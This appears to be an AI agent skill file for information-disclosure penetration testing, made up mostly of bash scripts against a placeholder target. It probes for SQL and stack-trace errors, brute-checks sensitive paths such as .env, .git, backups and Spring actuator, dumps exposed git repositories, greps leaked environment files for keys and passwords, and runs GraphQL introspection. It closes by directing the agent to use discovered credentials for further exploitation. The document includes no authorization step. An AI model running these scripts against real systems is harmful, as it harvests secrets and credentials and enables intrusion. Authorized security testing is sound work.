---
name: vuln-info-disclosure
description: "Information disclosure testing — error message leakage, debug endpoints, stack traces, API schema exposure, backup files, git repositories, environment variables exposure, directory listing. Triggers: 'information disclosure', 'info disclosure', 'error leak', 'stack trace', 'debug info', 'backup file', 'source code disclosure', 'git exposed', 'env exposure', 'directory listing'."
---

# Information Disclosure Testing

Discover and exploit inadvertent exposure of sensitive technical or business data.

---

## Phase 1: Error Message Enumeration

```bash
TARGET="https://TARGET"

# Trigger errors to reveal stack traces:
curl -s "$TARGET/api/v1/users/-1" | head -30
curl -s "$TARGET/api/v1/items/null" | head -30
curl -s "$TARGET/api/v1/search?q[]=" | head -30
curl -s "$TARGET/api/v1/" -H "Content-Type: application/json" -d "invalid json" | head -30

# SQL error disclosure:
curl -s "$TARGET/search?q='" | head -30  # SQL error
curl -s "$TARGET/search?q=1 AND 1=1" | head -30

# Path disclosure in errors:
curl -s "$TARGET/nonexistent-page" | grep -iE '/var/www|/home|/usr|C:\\|/app|/opt'
```

---

## Phase 2: Debug & Admin Endpoints

```bash
TARGET="https://TARGET"

# Common debug/admin endpoints:
DEBUG_ENDPOINTS=(
  "/.env" "/env" "/.env.local" "/.env.prod"
  "/debug" "/debug/vars" "/debug/pprof" "/_debug"
  "/actuator" "/actuator/env" "/actuator/health" "/actuator/info" "/actuator/beans" "/actuator/mappings"
  "/__debug__" "/phpinfo.php" "/info.php" "/server-status"
  "/.git/HEAD" "/.git/config" "/.svn/entries"
  "/backup.sql" "/backup.zip" "/database.sql"
  "/api/swagger.json" "/api/openapi.json" "/swagger-ui.html"
  "/graphql" "/graphiql" "/__graphql" "/api/graphql"
  "/metrics" "/prometheus" "/stats"
  "/_health" "/_status" "/_ping"
  "/api/v1/config" "/api/v1/settings"
  "/robots.txt" "/sitemap.xml" "/.well-known/"
  "/package.json" "/composer.json" "/requirements.txt"
)

for EP in "${DEBUG_ENDPOINTS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$EP")
  [ "$STATUS" != "404" ] && echo "$EP → $STATUS"
done | tee output/info_endpoints.txt
```

---

## Phase 3: Source Code & Config Exposure

```bash
TARGET="https://TARGET"

# Git repository exposure:
if curl -s "$TARGET/.git/HEAD" | grep -q "ref:"; then
  echo "GIT EXPOSED — dumping with git-dumper"
  pip3 install gitdumper 2>/dev/null
  python3 -m gitdumper "$TARGET/.git/" /tmp/git_dump/
  git -C /tmp/git_dump/ log --oneline 2>/dev/null | head -20
fi

# Environment file:
curl -s "$TARGET/.env" | grep -iE "(KEY|SECRET|PASSWORD|TOKEN|DB_|AWS|API)" | tee output/env_leak.txt

# Backup files:
for EXT in ".bak" ".old" ".orig" "~" ".swp" ".save"; do
  for FILE in "config" "database" "settings" "wp-config" ".env" "index"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$FILE$EXT")
    [ "$STATUS" == "200" ] && echo "FOUND: $FILE$EXT"
  done
done

# Spring Boot Actuator:
curl -s "$TARGET/actuator/env" | jq '.propertySources[] | select(.name | contains("applicationConfig")) | .properties' | head -50
curl -s "$TARGET/actuator/configprops" | jq .
```

---

## Phase 4: API Schema Disclosure

```bash
TARGET="https://TARGET"

# Swagger / OpenAPI:
for EP in "/swagger.json" "/openapi.json" "/api/swagger.json" "/api/openapi.yaml" "/v3/api-docs" "/api-docs"; do
  curl -s "$TARGET$EP" | python3 -m json.tool > /dev/null 2>&1 && \
    echo "API SCHEMA: $EP" && curl -s "$TARGET$EP" | jq '.paths | keys' | tee output/api_schema.txt
done

# GraphQL introspection:
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[].name' | head -30
```

---

## Output

Save to `output/`:
- `info_endpoints.txt` — non-404 sensitive endpoints
- `env_leak.txt` — environment variable values
- `api_schema.txt` — exposed API endpoint list

## Next Phase

→ Use discovered endpoints/credentials for further exploitation
→ `pentest-report` to document all information disclosure findings
